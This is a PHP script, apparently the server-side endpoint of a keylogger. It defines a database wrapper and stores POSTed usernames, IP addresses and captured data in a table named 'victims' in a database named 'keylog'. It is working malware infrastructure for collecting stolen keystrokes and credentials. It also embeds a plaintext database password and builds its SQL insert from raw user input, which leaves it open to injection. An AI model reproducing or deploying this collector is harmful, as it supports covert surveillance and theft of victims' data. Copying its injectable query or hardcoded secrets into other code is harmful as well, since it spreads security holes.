<?php
class VeriTabani {
	public $PDO;
	public $_host = "127.0.0.1";
	public $_database = "genel";
	public $_charset = "utf8";
	public $_user = "bilal";
	public $_pass = "93bilal93";

	public function __construct() {
       	/*$_host = "localhost";
		$_database = "keylog";
		$_charset = "utf8";
		$_user = "root";
		$_pass = "";*/
    }

	public function Connect(){
		try{
			$this->PDO = new PDO("mysql:host=".$this->_host."; dbname=".$this->_database."; charset=".$this->_charset, $this->_user, $this->_pass);
			$this->PDO->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

			return TRUE;;
		}catch(PDOException $e){
			echo "Hata(Connect):".$e->getMessage();
			return FALSE;
		}
	}
	
	public function Disconnect(){
		$this->PDO = null;
		//echo "Baglanti Kapatildi<br>";
	}

	public function ExecuteQuery($sql){
		try{
			return $this->PDO->query($sql,PDO::FETCH_ASSOC);
			/*$hata = $query->errorInfo();
			if(empty($hata[2])){
				echo json_encode($class_ders);
			}
			else
				echo $hata[2];*/
		}catch(PDOException $e){
			echo "Hata(ExecuteQuery):".$e->getMessage();
			return $e->getCode();
		}
	}

	public function PrepareExecute($sql, $array){
		try{
			$query = $this->PDO->prepare($sql,PDO::FETCH_ASSOC);
			$insert = $query->execute($array);
			if ( $insert ){
			    return $this->PDO->lastInsertId();
			}
			else
				return NULL;
		}catch(PDOException $e){
			echo "Hata(PrepareExecute):".$e->getMessage();
			return $e->getCode();
		}
	}
}

$veriTabani = new VeriTabani();
$veriTabani->Connect();	
$simdikiZaman = date('Y-m-d h:i:s');
	
$ekle = "INSERT INTO victims (kullanici_adi,ip_net,veri,tarih) VALUES ('".
		$_POST['kull']."','".
		$_POST['ip_net']."','".
		$_POST['veri']."','".
		$simdikiZaman."');";
		
if($veriTabani->ExecuteQuery($ekle ))
    echo "1";
else
    echo "0";
    echo mysql_error();


?>